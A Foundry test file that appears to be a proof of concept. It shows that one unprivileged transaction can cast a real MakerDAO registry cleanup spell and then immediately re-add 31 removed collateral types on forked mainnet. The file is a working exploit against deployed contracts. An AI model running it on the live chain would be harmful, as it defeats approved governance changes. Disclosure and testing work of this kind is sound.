// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.16;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

interface AtomicRegistryLike {
    function count() external view returns (uint256);
    function join(bytes32) external view returns (address);
}

interface AtomicSpellLike {
    function cast() external;
    function done() external view returns (bool);
}

contract AtomicCleanupReversal {
    function castAndRestore(address spell, address registry, address[] calldata adapters)
        external
        returns (uint256 restored)
    {
        AtomicSpellLike(spell).cast();
        for (uint256 i = 0; i < adapters.length; i++) {
            if (adapters[i] == address(0)) continue;
            (bool ok,) = registry.call(abi.encodeWithSignature("add(address)", adapters[i]));
            if (ok) restored++;
        }
    }
}

contract IlkRegistryAtomicGovernanceReversalTest is Test {
    uint256 internal constant PRE_CAST_BLOCK = 23_118_263;
    address internal constant REGISTRY = 0x5a464C28D19848f44199D003BeF5ecc87d090F87;
    address internal constant CLEANUP_SPELL = 0x26009aFf7fE39bF7611d66E0D38CAc43b3A93CD5;

    AtomicRegistryLike internal constant registry = AtomicRegistryLike(REGISTRY);
    AtomicSpellLike internal constant spell = AtomicSpellLike(CLEANUP_SPELL);

    function _targets() internal pure returns (bytes32[] memory t) {
        t = new bytes32[](42);
        t[0] = "LSE-MKR-A";
        t[1] = "AAVE-A";
        t[2] = "BAL-A";
        t[3] = "BAT-A";
        t[4] = "COMP-A";
        t[5] = "CRVV1ETHSTETH-A";
        t[6] = "GNO-A";
        t[7] = "GUSD-A";
        t[8] = "KNC-A";
        t[9] = "LINK-A";
        t[10] = "LRC-A";
        t[11] = "MANA-A";
        t[12] = "MATIC-A";
        t[13] = "PAXUSD-A";
        t[14] = "RENBTC-A";
        t[15] = "RETH-A";
        t[16] = "RWA003-A";
        t[17] = "RWA006-A";
        t[18] = "RWA007-A";
        t[19] = "RWA008-A";
        t[20] = "RWA010-A";
        t[21] = "RWA011-A";
        t[22] = "RWA012-A";
        t[23] = "RWA013-A";
        t[24] = "RWA014-A";
        t[25] = "RWA015-A";
        t[26] = "TUSD-A";
        t[27] = "UNI-A";
        t[28] = "UNIV2AAVEETH-A";
        t[29] = "UNIV2DAIETH-A";
        t[30] = "UNIV2DAIUSDT-A";
        t[31] = "UNIV2ETHUSDT-A";
        t[32] = "UNIV2LINKETH-A";
        t[33] = "UNIV2UNIETH-A";
        t[34] = "UNIV2USDCETH-A";
        t[35] = "UNIV2WBTCDAI-A";
        t[36] = "UNIV2WBTCETH-A";
        t[37] = "USDC-A";
        t[38] = "USDC-B";
        t[39] = "USDT-A";
        t[40] = "YFI-A";
        t[41] = "ZRX-A";
    }

    function testOneUnprivilegedTransactionCastsSpellAndReversesCleanup() public {
        vm.createSelectFork("mainnet", PRE_CAST_BLOCK);
        bytes32[] memory targets = _targets();
        address[] memory adapters = new address[](targets.length);
        uint256 joinBackedTargets;
        for (uint256 i = 0; i < targets.length; i++) {
            adapters[i] = registry.join(targets[i]);
            if (adapters[i] != address(0)) joinBackedTargets++;
        }

        assertEq(registry.count(), 72, "unexpected pre-cast count");
        assertEq(joinBackedTargets, 41, "unexpected number of Join-backed cleanup targets");
        assertFalse(spell.done(), "spell already cast at the selected block");

        AtomicCleanupReversal attacker = new AtomicCleanupReversal();
        uint256 beforeGas = gasleft();
        uint256 restored = attacker.castAndRestore(CLEANUP_SPELL, REGISTRY, adapters);
        uint256 gasUsed = beforeGas - gasleft();

        console2.log("spell done", spell.done());
        console2.log("Join-backed cleanup targets", joinBackedTargets);
        console2.log("restored atomically", restored);
        console2.log("final registry count", registry.count());
        console2.log("atomic call gas used", gasUsed);
        console2.log("block gas limit", block.gaslimit);

        assertTrue(spell.done(), "approved spell did not execute");
        assertEq(restored, 31, "unexpected number of atomically restored ilks");
        assertEq(registry.count(), 61, "transaction did not end with cleanup reversed");
        assertLt(gasUsed, block.gaslimit, "atomic reversal cannot fit in one block");

        assertTrue(registry.join("AAVE-A") != address(0), "AAVE-A cleanup survived the transaction");
        assertTrue(registry.join("USDC-A") != address(0), "USDC-A cleanup survived the transaction");
        assertTrue(registry.join("ZRX-A") != address(0), "ZRX-A cleanup survived the transaction");
    }
}
